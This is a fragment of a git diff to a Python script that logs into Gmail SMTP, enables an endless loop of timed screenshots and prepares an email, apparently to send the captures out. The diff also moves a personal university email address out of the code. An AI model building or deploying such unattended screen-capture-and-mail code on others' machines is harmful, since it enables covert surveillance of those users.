@@ -8,7 +8,7 @@ import assets
 ####  GMAIL SMTP LOGIN  ####
 GMAIL_USERNAME = assets.user
 GMAIL_PWD = assets.pwd
-recipients = "jf2813@nyu.edu"
+recipients = assets.recipients
 email_subject = "testing"
 body_of_email = "did the body work?"
 
@@ -26,8 +26,8 @@ def screenshot():
 		#ImageGrab.grab_to_file('img'+str(i)+'.png')
 		time.sleep(5)
 
-# while True:
-# 	screenshot()
+while True:
+	screenshot()
 
 ####  COMPILE AND SEND EMAIL  ####
 headers = "\r\n".join(["from: " + GMAIL_USERNAME,
